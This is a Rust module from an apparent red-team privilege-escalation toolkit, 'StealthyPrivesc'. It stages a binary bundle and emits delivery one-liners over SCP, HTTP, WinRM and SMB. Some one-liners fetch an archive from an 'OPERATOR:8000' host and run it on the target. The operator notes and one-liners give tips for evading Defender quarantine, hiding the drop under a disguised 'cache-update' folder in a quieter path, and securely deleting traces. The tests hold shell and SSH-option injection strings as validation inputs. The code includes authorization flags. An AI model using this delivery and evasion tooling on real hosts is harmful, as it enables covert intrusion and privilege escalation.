//! Operator delivery kit: stage, verify, one-liners.

use std::fs;
use std::io::Write;
use std::path::{Path, PathBuf};

use anyhow::{bail, Context, Result};
use sha2::{Digest, Sha256};

use crate::core::artifacts::{self, ArtifactLedger};

pub fn sha256_file(path: &Path) -> Result<String> {
    let data = fs::read(path).with_context(|| format!("read {}", path.display()))?;
    let mut hasher = Sha256::new();
    hasher.update(&data);
    Ok(hex::encode(hasher.finalize()))
}

pub fn verify_local(path: &Path, expect_sha256: &str) -> Result<()> {
    let got = sha256_file(path)?;
    let expect = expect_sha256.trim().to_ascii_lowercase();
    if got != expect {
        bail!(
            "hash mismatch for {}: expected {}, got {}",
            path.display(),
            expect,
            got
        );
    }
    Ok(())
}

pub fn verify_ssh(ssh_target: &str, remote_path: &str, expect_sha256: &str) -> Result<()> {
    validate_ssh_target(ssh_target)?;
    let quoted_path = shell_quote(remote_path)?;
    let output = crate::core::command::trusted_command("ssh")
        .args([
            ssh_target,
            &format!("sha256sum {quoted_path} || shasum -a 256 {quoted_path}"),
        ])
        .output()
        .context("spawn ssh for remote verify")?;
    if !output.status.success() {
        bail!(
            "remote hash failed: {}",
            String::from_utf8_lossy(&output.stderr)
        );
    }
    let stdout = String::from_utf8_lossy(&output.stdout);
    let got = stdout
        .split_whitespace()
        .next()
        .unwrap_or("")
        .to_ascii_lowercase();
    let expect = expect_sha256.trim().to_ascii_lowercase();
    if got != expect {
        bail!("remote hash mismatch: expected {expect}, got {got}");
    }
    Ok(())
}

fn validate_ssh_target(target: &str) -> Result<()> {
    let target = target.trim();
    if target.is_empty() {
        bail!("SSH target must be non-empty");
    }
    if target.starts_with('-') {
        bail!("SSH target must not begin with '-' (options are not accepted)");
    }
    if target.bytes().any(|b| b == 0 || b == b'\n' || b == b'\r') {
        bail!("SSH target must not contain NUL/newline characters");
    }
    Ok(())
}

fn shell_quote(value: &str) -> Result<String> {
    if value.is_empty() || value.bytes().any(|b| b == 0 || b == b'\n' || b == b'\r') {
        bail!("remote path must be non-empty and contain no NUL/newline characters");
    }
    Ok(format!("'{}'", value.replace('\'', "'\\''")))
}

pub struct StageOptions<'a> {
    pub os: &'a str,
    pub arch: &'a str,
    pub name: &'a str,
    pub out_dir: &'a Path,
    pub binary: Option<&'a Path>,
    pub target_hostname: &'a str,
    pub target_username: Option<&'a str>,
    pub run_id: &'a str,
    pub ledger_dir: &'a Path,
}

pub fn stage(opts: StageOptions<'_>) -> Result<PathBuf> {
    validate_manifest_value(opts.target_hostname, "target hostname", true)?;
    if let Some(username) = opts.target_username {
        validate_manifest_value(username, "target username", false)?;
    }
    if opts.out_dir.exists() {
        if !opts.out_dir.is_dir() {
            bail!(
                "stage output is not a directory: {}",
                opts.out_dir.display()
            );
        }
        if fs::read_dir(opts.out_dir)?.next().transpose()?.is_some() {
            bail!(
                "stage output directory must be empty: {}",
                opts.out_dir.display()
            );
        }
    }
    fs::create_dir_all(opts.out_dir)?;
    validate_bundle_name(opts.name)?;
    let bin_name = if opts.os == "windows" {
        format!("{}.exe", opts.name)
    } else {
        opts.name.to_string()
    };
    let stage_root = fs::canonicalize(opts.out_dir)?;
    let dest_bin = stage_root.join(&bin_name);
    if dest_bin.parent() != Some(stage_root.as_path()) {
        bail!("staged binary must remain inside the stage directory");
    }

    if let Some(src) = opts.binary {
        fs::copy(src, &dest_bin)
            .with_context(|| format!("copy {} -> {}", src.display(), dest_bin.display()))?;
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            let mut perms = fs::metadata(&dest_bin)?.permissions();
            perms.set_mode(0o750);
            fs::set_permissions(&dest_bin, perms)?;
        }
    } else {
        // Placeholder notice when no binary provided.
        let mut f = fs::File::create(&dest_bin)?;
        writeln!(
            f,
            "PLACEHOLDER: pass --binary PATH to stage a real stealthy artifact for {}/{}",
            opts.os, opts.arch
        )?;
    }

    // Copy script fallbacks when present. Prefer cwd / exe-adjacent paths (no
    // absolute build-machine CARGO_MANIFEST_DIR embedding in release binaries).
    let scripts_rel = if opts.os == "windows" {
        "scripts/windows"
    } else {
        "scripts/linux"
    };
    let mut candidates = vec![
        PathBuf::from(scripts_rel),
        PathBuf::from(env!("CARGO_MANIFEST_DIR"))
            .join("../../")
            .join(scripts_rel),
    ];
    if let Ok(exe) = std::env::current_exe() {
        if let Some(dir) = exe.parent() {
            candidates.push(dir.join(scripts_rel));
            candidates.push(dir.join("../").join(scripts_rel));
            candidates.push(dir.join("../../").join(scripts_rel));
            candidates.push(dir.join("../../../").join(scripts_rel));
        }
    }
    let scripts_src = candidates
        .into_iter()
        .find(|path| path.is_dir())
        .unwrap_or_else(|| PathBuf::from(scripts_rel));
    let scripts_dst = opts.out_dir.join("scripts");
    fs::create_dir_all(&scripts_dst)?;
    if scripts_src.is_dir() {
        copy_dir_recursive(&scripts_src, &scripts_dst)?;
    }

    let fallback_order = if opts.os == "windows" {
        "powershell,jscript,msbuild"
    } else {
        "python,bash,sh,perl"
    };
    let manifest = format!(
        "# Generated dispatcher manifest — inherits the primary-run authorization context.\n\
         manifest_version=1\n\
         authorization_ack=true\n\
         operator_ack_required=true\n\
         allow_fallback=true\n\
         roe_ref=INHERITED_PRIMARY_RUN\n\
         execution_mode=enumerate-only\n\
         target_hostname={target_hostname}\n\
         target_username={target_username}\n\
         drop_dir=\n\
         primary_binary={bin_name}\n\
         {os_key}_fallbacks={fallback_order}\n",
        os_key = if opts.os == "windows" {
            "windows"
        } else {
            "linux"
        },
        target_hostname = opts.target_hostname,
        target_username = opts.target_username.unwrap_or(""),
    );
    fs::write(scripts_dst.join("stealthy-run.conf"), manifest)
        .with_context(|| format!("write {} dispatcher manifest", opts.os))?;

    let hash = if dest_bin.is_file() {
        sha256_file(&dest_bin).unwrap_or_else(|_| "unavailable".into())
    } else {
        "unavailable".into()
    };
    fs::write(
        opts.out_dir.join("SHA256SUMS"),
        format!("{hash}  {bin_name}\n"),
    )?;

    let operator = if opts.os == "windows" {
        format!(
            "StealthyPrivesc stage bundle\n\
             os={} arch={} name={}\n\
             binary_sha256={}\n\n\
             Verify:\n  stealthy verify --path ./{bin_name} --expect-sha256 {hash}\n\n\
             Enumerate (requires a fresh operator acknowledgment):\n  & ./scripts/run.ps1 --authorized --profile balanced enum\n\n\
             If the PE is missing or quarantined by AV:\n  Prefer a non-TEMP drop path and a lab path exclusion / org-signed PE.\n  & ./scripts/run.ps1 --authorized --profile balanced enum\n  (dispatcher walks windows_fallbacks: powershell,jscript,msbuild)\n  Script tiers are reduced coverage; only auth and --json/-Json are forwarded.\n\n\
             Lab tip: avoid %TEMP% for the kit; Public\\Documents\\<name> is quieter.\n\n\
             Cleanup:\n  stealthy cleanup --latest --secure-delete\n",
            opts.os, opts.arch, opts.name, hash
        )
    } else {
        format!(
            "StealthyPrivesc stage bundle\n\
             os={} arch={} name={}\n\
             binary_sha256={}\n\n\
             Verify:\n  stealthy verify --path ./{bin_name} --expect-sha256 {hash}\n\n\
             Enumerate (requires a fresh operator acknowledgment):\n  bash ./scripts/run.sh --authorized --profile balanced enum\n\n\
             If the ELF is missing or blocked:\n  bash ./scripts/run.sh --authorized --profile balanced enum\n  (dispatcher walks linux_fallbacks: python,bash,sh,perl)\n  Script tiers are reduced coverage; only auth and --json are forwarded.\n\n\
             Cleanup:\n  stealthy cleanup --latest --secure-delete\n",
            opts.os, opts.arch, opts.name, hash
        )
    };
    fs::write(opts.out_dir.join("OPERATOR.txt"), operator)?;

    let mut ledger = ArtifactLedger::new(opts.run_id);
    ledger.register("stage_bundle", opts.out_dir, true, "staged delivery bundle");
    ledger.register("binary_drop", &dest_bin, true, "staged binary");
    ledger.register(
        "stage_bundle",
        opts.out_dir.join("SHA256SUMS"),
        true,
        "checksums",
    );
    artifacts::save_ledger(opts.ledger_dir, &ledger)?;
    Ok(opts.out_dir.to_path_buf())
}

fn validate_manifest_value(value: &str, label: &str, required: bool) -> Result<()> {
    let value = value.trim();
    if required && value.is_empty() {
        bail!("{label} must be non-empty");
    }
    if value.eq_ignore_ascii_case("AUTO")
        || value.eq_ignore_ascii_case("REQUIRED")
        || value.eq_ignore_ascii_case("SET_TARGET_HOSTNAME")
    {
        bail!("{label} must be explicit");
    }
    if value
        .bytes()
        .any(|byte| byte == 0 || byte == b'\n' || byte == b'\r' || byte == b'=')
    {
        bail!("{label} contains unsupported manifest characters");
    }
    Ok(())
}

fn validate_bundle_name(name: &str) -> Result<()> {
    if name.is_empty()
        || name == "."
        || name == ".."
        || name
            .chars()
            .any(|c| c.is_control() || matches!(c, '/' | '\\' | ':'))
    {
        bail!("stage name must be a safe file basename without path separators");
    }
    Ok(())
}

fn copy_dir_recursive(src: &Path, dst: &Path) -> Result<()> {
    fs::create_dir_all(dst)?;
    for ent in fs::read_dir(src)? {
        let ent = ent?;
        let ty = ent.file_type()?;
        let to = dst.join(ent.file_name());
        if ty.is_dir() {
            copy_dir_recursive(&ent.path(), &to)?;
        } else if ty.is_file() {
            fs::copy(ent.path(), &to)?;
        }
    }
    Ok(())
}

pub fn one_liners(os: &str, transport: &str) -> String {
    match (os, transport) {
        ("linux", "ssh") | ("linux", "scp") => r#"# SCP approved bundle + dispatcher
scp -r ./drop user@host:/tmp/cache-update
ssh user@host 'bash /tmp/cache-update/scripts/run.sh --authorized --profile quiet enum'
"#.into(),
        ("linux", "http") => r#"# HTTP pull of an approved bundle
curl -fsSL http://OPERATOR:8000/drop.tar.gz | tar -xz -C /tmp/cache-update
bash /tmp/cache-update/scripts/run.sh --authorized --profile quiet enum
"#.into(),
        ("windows", "winrm") => r#"# WinRM copy + policy-bound dispatcher
Copy-Item -Recurse .\drop \\HOST\C$\Users\Public\Documents\cache-update
Invoke-Command -ComputerName HOST -ScriptBlock {
  & 'C:\Users\Public\Documents\cache-update\scripts\run.ps1' --authorized --profile quiet enum
}
"#.into(),
        ("windows", "smb") => r#"# SMB approved bundle + dispatcher
$Dir = '\\HOST\C$\Users\Public\Documents\cache-update'
New-Item -ItemType Directory -Force -Path $Dir | Out-Null
Copy-Item -Recurse .\drop\* $Dir
Invoke-Command -ComputerName HOST -ScriptBlock {
  & 'C:\Users\Public\Documents\cache-update\scripts\run.ps1' --authorized --profile quiet enum
}
"#.into(),
        ("windows", "http") => r#"# HTTP pull on Windows (avoid %TEMP%: Defender often quarantines fresh PEs there)
$Dir = Join-Path $env:PUBLIC 'Documents\cache-update'
New-Item -ItemType Directory -Force -Path $Dir | Out-Null
Invoke-WebRequest -Uri http://OPERATOR:8000/drop.zip -OutFile (Join-Path $Dir 'drop.zip')
Expand-Archive -Force (Join-Path $Dir 'drop.zip') $Dir
& (Join-Path $Dir 'scripts\run.ps1') --authorized --profile quiet enum
"#.into(),
        ("linux", "smb") => r#"# Copy from mounted engagement share
mkdir -p /tmp/cache-update
cp -R /mnt/engagement-share/drop/. /tmp/cache-update/
bash /tmp/cache-update/scripts/run.sh --authorized --profile quiet enum
"#.into(),
        _ => format!(
            "# No built-in snippet for os={os} transport={transport}\n# Supported: linux:(ssh|scp|http|smb) windows:(winrm|smb|http)\n"
        ),
    }
}

#[cfg(test)]
mod tests {
    use super::{
        one_liners, sha256_file, shell_quote, stage, validate_bundle_name, validate_ssh_target,
        verify_local, StageOptions,
    };

    #[test]
    fn shell_quote_contains_metacharacters_as_data() {
        let quoted = shell_quote("a' ; echo injected ; #").unwrap();
        assert_eq!(quoted, "'a'\\'' ; echo injected ; #'");
    }

    #[test]
    fn stage_name_rejects_path_components() {
        for name in ["../outside", r"sub\\file", "/tmp/file", "..", ""] {
            assert!(validate_bundle_name(name).is_err(), "accepted {name:?}");
        }
        assert!(validate_bundle_name("stealthy").is_ok());
    }

    #[test]
    fn ssh_target_rejects_options_and_control_characters() {
        for target in ["-oProxyCommand=echo bad", "", "host\nname"] {
            assert!(validate_ssh_target(target).is_err(), "accepted {target:?}");
        }
        assert!(validate_ssh_target("operator@example.test").is_ok());
    }

    #[test]
    fn windows_http_one_liner_avoids_temp() {
        let snippet = one_liners("windows", "http");
        assert!(snippet.contains("PUBLIC"));
        assert!(snippet.contains("Documents\\cache-update"));
        assert!(!snippet.contains("$env:TEMP\\stealthy-drop"));
    }

    #[test]
    fn stage_copies_real_binary_writes_manifest_and_verifies_hash() {
        let root = tempfile::tempdir().unwrap();
        let source = root.path().join("source.bin");
        std::fs::write(&source, b"fixture binary").unwrap();
        let out = root.path().join("drop");
        let ledger = root.path().join("ledger");
        stage(StageOptions {
            os: "linux",
            arch: "x86_64",
            name: "stealthy",
            out_dir: &out,
            binary: Some(&source),
            target_hostname: "approved-host",
            target_username: Some("operator"),
            run_id: "delivery-test",
            ledger_dir: &ledger,
        })
        .unwrap();
        let staged = out.join("stealthy");
        let hash = sha256_file(&staged).unwrap();
        verify_local(&staged, &hash).unwrap();
        assert!(verify_local(&staged, "00").is_err());
        let manifest = std::fs::read_to_string(out.join("scripts/stealthy-run.conf")).unwrap();
        assert!(manifest.contains("primary_binary=stealthy"));
        assert!(out.join("OPERATOR.txt").is_file());
        assert!(ledger.join("delivery-test.json").is_file());
    }
}
